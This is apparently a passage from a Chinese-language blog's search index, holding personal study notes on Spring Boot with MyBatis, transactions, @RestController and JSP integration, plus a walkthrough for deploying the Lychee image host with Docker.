      <title>Spring Boot 学习笔记 05</title>
      <link href="/2021/08/08/4b359cf9184b-q1jun/"/>
      <url>/2021/08/08/4b359cf9184b-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot学习笔记-05"><a href="#Spring-Boot学习笔记-05" class="headerlink" title="Spring Boot学习笔记 05"></a>Spring Boot学习笔记 05</h1><h2 id="0x01-Mybatis-映射文件转移到resources文件夹下"><a href="#0x01-Mybatis-映射文件转移到resources文件夹下" class="headerlink" title="0x01 Mybatis 映射文件转移到resources文件夹下"></a>0x01 Mybatis 映射文件转移到resources文件夹下</h2><p>关于Mapper映射文件的存放位置的写法有两种：</p><ol><li>将mapper接口和mapper映射文件存放到src&#x2F;main&#x2F;java同一目录下，还需要在pom.xml文件中手动指定资源文件夹路径resources。</li><li>将mapper接口和映射文件夹分开存放，mapper接口类存放到src&#x2F;main&#x2F;java目录下，mapper映射文件存放到resources（类路径），在springboot核心配置文件中指定mapper映射文件的存放位置。</li></ol><p>将src下的XML映射文件移动到resources文件夹Mapper中，这样有助于我们管理xml映射文件。</p><p>然后在application.properties中添加:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mybatis.mapper-locations=classpath:mapper/*.xml</span><br></pre></td></tr></table></figure><p>这样我们就不用像上一次在pom.xml里的<build>中添加<resources>这一项了</p><blockquote><p> 因为maven只编译src中的<code>.java</code>文件</p></blockquote><h2 id="0x02-SpringBoot集成Mybatis最主要的是两个注解"><a href="#0x02-SpringBoot集成Mybatis最主要的是两个注解" class="headerlink" title="0x02 SpringBoot集成Mybatis最主要的是两个注解"></a>0x02 SpringBoot集成Mybatis最主要的是两个注解</h2><ul><li>@Mapper 需要在每一个Mapper接口类上添加，作用扫描dao接口</li><li>@MapperScan 是在Springboot启动入口类上添加的，它是一次扫描所有的包</li></ul><h2 id="0x03-SpringBoot下使用事务"><a href="#0x03-SpringBoot下使用事务" class="headerlink" title="0x03 SpringBoot下使用事务"></a>0x03 SpringBoot下使用事务</h2><p>事务是一个完整的功能，也叫做是一个完整的业务。</p><p>事务只跟什么SQL语句有关系？<br>事务只跟DML语句有关系：增删改</p><p>SQL语句：DML,DQL,DDL,TCL,DCL</p><p>使用事务功能的时候只需要在java代码添加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br></pre></td></tr></table></figure><p>这样执行该方法的时候会看成事务来运作。</p><p>当事务其中一部分失效时会回退到开始阶段。</p><p>在入口类Application.java中可以添加:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br></pre></td></tr></table></figure><p>这个注解来开启事务功能。</p><h2 id="0x04-SpringBoot注解-RestController"><a href="#0x04-SpringBoot注解-RestController" class="headerlink" title="0x04 SpringBoot注解@RestController"></a>0x04 SpringBoot注解@RestController</h2><p>@RestCOntroller相当于控制层类上加<code>@Controller</code> + 方法上加<code>@ResponseBody</code></p><p>意味着当前控制层类中所有方法返还的都是JSON对象。</p><p>如以下xxxController.java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.springboot.springboot002.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/springboot/say&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello ,Springboot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>等同于:(不需要@ResponseBody)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.springboot.springboot002.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/springboot/say&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello ,Springboot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 04</title>
      <link href="/2021/08/06/9f999f2edeca-q1jun/"/>
      <url>/2021/08/06/9f999f2edeca-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot学习笔记-04"><a href="#Spring-Boot学习笔记-04" class="headerlink" title="Spring Boot学习笔记 04"></a>Spring Boot学习笔记 04</h1><h2 id="xxxMapper-xml内容分析"><a href="#xxxMapper-xml内容分析" class="headerlink" title="xxxMapper.xml内容分析"></a>xxxMapper.xml内容分析</h2><blockquote><p>Mybatis逆向生成的文件只有单表操作。</p></blockquote><p>文件头(UTF-8)编码:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的xxxMapper.xml内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.springboot.springboot012mybatis.mapper.StudentMapper&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>resultMap作用：</p><ol><li>当数据库中字段名称与实体类对象的属性名不一样时，可以进行转换</li><li>当查询的结果没有对应一个表的时候，可以自定义一个结果集</li></ol><p>其中：</p><ul><li>id 标签只能修改主键字段</li><li>result 除了主键以外的字段</li><li>column 数据库中的字段名称</li><li>property 映射对象的属性名称</li><li>jdbcType 列中数据库中字段的类型（可以忽略不写）</li></ul><blockquote><p>如果数据库中字段名称由多个单词构成，通过Mybatis逆向工程生成的对象属性名称<br>会按照驼峰命名法规则生成属性名称。<br>其中：数据库中字段名称由多个单词构成时候必须使用下划线_分隔</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.springboot.springboot012mybatis.model.Student&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sql语句片段，将公共的部分抽取出来,可以通过include标签引用的sql语句片段:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;Base_Column_List&quot;</span>&gt;</span></span><br><span class="line">    id,name,age</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Docker搭建图床</title>
      <link href="/2021/08/06/44d4d934f4d6-q1jun/"/>
      <url>/2021/08/06/44d4d934f4d6-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="用Docker搭建图床"><a href="#用Docker搭建图床" class="headerlink" title="用Docker搭建图床"></a>用Docker搭建图床</h1><h2 id="第一步，安装-docker-："><a href="#第一步，安装-docker-：" class="headerlink" title="第一步，安装 docker ："></a>第一步，安装 docker ：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker</span><br></pre></td></tr></table></figure><h2 id="第二步，启动-docker："><a href="#第二步，启动-docker：" class="headerlink" title="第二步，启动 docker："></a>第二步，启动 docker：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>也可以设置开机自启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h2 id="第三步，把别人已经做好的镜像拉下来"><a href="#第三步，把别人已经做好的镜像拉下来" class="headerlink" title="第三步，把别人已经做好的镜像拉下来"></a>第三步，把别人已经做好的镜像拉下来</h2><p>在 docker 中拉镜像跟 Git 拉仓库差不多，命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker imgae pull</span><br></pre></td></tr></table></figure><p>这里需要拉的是 kdelfour&#x2F;lychee-docker，所以完整命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image pull kdelfour/lychee-docker</span><br></pre></td></tr></table></figure><p>镜像拉下来后，你可以用 <code>ls</code> 看一下是不是有这个镜像了（<code>docker image ls</code>）。</p><h2 id="第四步，启动这个镜像"><a href="#第四步，启动这个镜像" class="headerlink" title="第四步，启动这个镜像"></a>第四步，启动这个镜像</h2><p>需要说明的是端口映射的问题。由于我的服务器已经搭了个人网站，也用的浏览器默认的 80 端口，所以图床就不能用 80，我改用 5120，完整命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 5120:80 kdelfour/lychee-docker</span><br></pre></td></tr></table></figure><blockquote><p>访问 5120 端口，映射到 docker 容器里边的 80 端口）。</p></blockquote><p>命令 <code>docker container ls</code> 是查看正在运行的容器。可以看到第一次用这个命令的时候，没有容器在跑；启动之后就有了。</p><h2 id="第五步，访问http-你的域名-5120"><a href="#第五步，访问http-你的域名-5120" class="headerlink" title="第五步，访问http://你的域名:5120"></a>第五步，访问<code>http://你的域名:5120</code></h2><p>由于我是在本地的虚拟机里搭建，所以访问的是 <code>http://ip:5120</code> 。</p><p>进入到初始化阶段。可以看到 Database Host 、Data Name 和 Table predix 是选填，那我们就不管它。而 Username 和 Password 默认都是 lychee 。输入后点击 connect，你会看到它要你新建一个用户名和密码，这是你之后登录图床要用到的。</p><h2 id="第六步，创建-ablum，上传图片"><a href="#第六步，创建-ablum，上传图片" class="headerlink" title="第六步，创建 ablum，上传图片"></a>第六步，创建 ablum，上传图片</h2><p>右上角 + –&gt; Upload Photo，然后就可以愉快的上传图片了。lychee 还提供了其他导入图片方式，点击符号 + 可自行按需选择。更多用法请自己探索。</p><p>所以我们上传的图片到底去哪儿了呢。这时候我们需要先进入这个容器。命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container <span class="built_in">ls</span> </span><br></pre></td></tr></table></figure><p>会显示容器的 CONTAINER ID，拿到这个 ID 后，键入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container <span class="built_in">exec</span> -it 9a8e6f34294a /bin/bash</span><br></pre></td></tr></table></figure><p>就进入容器了。</p><p>现在可以 <code>ls</code> 一下，是不是感觉进入了一个 linux 终端，其实这就是 docker 想做的。然后关注 uploads 目录，可以看到图片就在 big 目录下。</p><p>肯定会有人说卧槽，那我怎么把图片取出来呢？事实上，lychee 提供了网页的下载方式，想在服务器上操作也 OK 呀。把图片名复制下来（这个经过 hash 处理，基本是独一无二了），在你的服务器上用 <code>find</code> 命令搜索，不就找到它的绝对路径了嘛！</p><p>最后附上卸载方式：</p><ul><li>先停止运行的容器：<code>docker container stop [container-id]</code></li><li>然后删除容器：<code>docker container rm [container-id]</code></li><li>最后删除镜像：<code>docker image rmi [image-id]</code></li></ul><p>获取对应的 id 可以通过命令：<code>docker container ls </code>和 <code>docker image ls</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Docker </tag>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 03</title>
      <link href="/2021/08/04/54715f549ae4-q1jun/"/>
      <url>/2021/08/04/54715f549ae4-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot学习笔记-03"><a href="#Spring-Boot学习笔记-03" class="headerlink" title="Spring Boot学习笔记 03"></a>Spring Boot学习笔记 03</h1><p>​        </p><h2 id="0x01-SpringBoot集成JSP"><a href="#0x01-SpringBoot集成JSP" class="headerlink" title="0x01 SpringBoot集成JSP"></a>0x01 SpringBoot集成JSP</h2><p>打开IDEA创建SpringBoot项目后，在src文件夹的main中创建一个新的文件夹webapp来存放web资源（假如原来没有webapp文件夹）。</p><p>创建好在模块设置中的模块-&gt;Web-&gt;Web资源目录添加上面创建的webapp目录，相对与部署根的路径为<code>/</code>,然后点击创建工件，最后点击应用，就完成了webapp的设置，待会在里面创建jsp文件就行了。</p><p>由于项目本身对jsp的解析并不支持，所以在pom.xml文件里面要添加对jsp解析的包的依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        引入SpringBoot内嵌Tomcat对jsp的解析包,不添加解析不了jsp--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        仅仅只是展示jsp页面，只添加以下一个依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后为了使jsp正常编译，还要在pom.xml的__<build>__中添加:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                源文件夹--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                指定编译到META-INF/resources--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                指定源文件夹中的哪些资源要编译进去--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                    所有东西： *.*--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在核心配置文件中添加视图解析器:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置视图解析器</span></span><br><span class="line"><span class="attr">spring.mvc.view.prefix</span>=<span class="string">/</span></span><br><span class="line"><span class="attr">spring.mvc.view.suffix</span>=<span class="string">.jsp</span></span><br></pre></td></tr></table></figure><p>接下来我们就要设置@Controller了，在Application.java文件的同级目录或下级目录创建一个Controller&#x2F;IndexController.java，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.springboot.springboot010jsp.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/say&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        mv.addObject(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Hello Springboot!&quot;</span>);</span><br><span class="line">        mv.setViewName(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;say&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在webapp上创建对应的say.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;$&#123;message&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>次jsp用来显示<code>$&#123;message&#125;</code>结果:</p><p>浏览器输入localhost:8080&#x2F;say，输出结果为：<strong>Hello Springboot!</strong></p><p>浏览器输入localhost:8080&#x2F;index，输出结果为：<strong>Hello world</strong></p><p>分别对应@Controller里面两个Attribute。</p><blockquote><p> 以上步骤缺一不可！</p></blockquote><h2 id="0x02-如何在一个单纯的Maven框架上手动配置SpringBoot"><a href="#0x02-如何在一个单纯的Maven框架上手动配置SpringBoot" class="headerlink" title="0x02 如何在一个单纯的Maven框架上手动配置SpringBoot"></a>0x02 如何在一个单纯的Maven框架上手动配置SpringBoot</h2><p>前面我们创建一个SpringBoot项目都是用idea自带的Springboot框架来创建，那我们如何在一个只有pom.xml和Meven文件结构的项目里面自己手动创建一个SPringboot项目呢，这个方法适用于一开始创建SpringBoot项目时网不好的情况。</p><p>首先我们在Pom.xml文件里面添加对应的SpringBoot依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--SpringBoot父工程GAV坐标--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        SpringBoot框架Web项目起步依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        SpringBoot框架测试起步依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            SpringBoot项目打包编译的插件--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p> 这里只给出需要添加的部分，并不是覆盖的意思。</p></blockquote><p>然后文件结构也需要改变：</p><p>在src&#x2F;main&#x2F;java中创建包<code>com.auspic1ous.springboot</code></p><p>在其中创建一个Application.java(名字随意):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.auspic1ous.springboot;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="comment">//Springboot项目启动入口类</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span><span 